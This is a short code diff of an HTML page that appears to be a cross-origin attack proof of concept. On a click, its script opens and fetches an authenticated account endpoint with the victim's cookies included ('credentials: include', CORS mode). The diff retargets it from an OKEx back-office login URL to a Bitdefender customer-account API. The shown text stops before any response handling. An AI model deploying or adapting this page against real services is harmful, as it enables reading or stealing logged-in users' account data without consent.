@@ -5,9 +5,9 @@
   <script>
     document.addEventListener("DOMContentLoaded", () => {
       document.onclick = () => {
-        open('https://opboss.okex.org/newboss/login');
+        open('https://api.customerzone.bitdefender.com/v1/account/me');
 
-        fetch('https://opboss.okex.org/newboss/login', {
+        fetch('https://api.customerzone.bitdefender.com/v1/account/me', {
           method: 'GET',
           credentials: 'include',
           mode: 'cors'
